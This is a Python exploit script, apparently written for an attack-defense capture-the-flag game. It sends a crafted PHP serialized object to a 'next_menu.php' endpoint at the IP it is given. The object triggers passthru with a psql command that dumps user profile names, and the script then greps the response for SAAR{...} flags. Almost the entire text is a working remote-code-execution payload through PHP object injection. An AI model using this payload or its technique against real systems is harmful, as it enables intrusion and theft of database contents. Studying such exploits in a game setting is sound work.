#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re, json
from storage import storage_set, storage_get

ip = sys.argv[1]

url = 'http://' + ip + '/mensaar/next_menu.php'


s = requests.Session()

headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

data="data=O:8:\"stdClass\":2:{s:4:\"func\";a:1:{s:4:\"save\";s:8:\"passthru\";}s:6:\"monday\";a:1:{i:0;s:40:\"psql -c 'SELECT name FROM user_profile;'\";}}&token=abc&hash=da39a3ee5e6b4b0d3255bfef95601890afd80709"

html = s.post(url, data=data, headers=headers, timeout=(None, None))


print(re.findall('SAAR\{[A-Za-z0-9-_]{32}\}', html.text))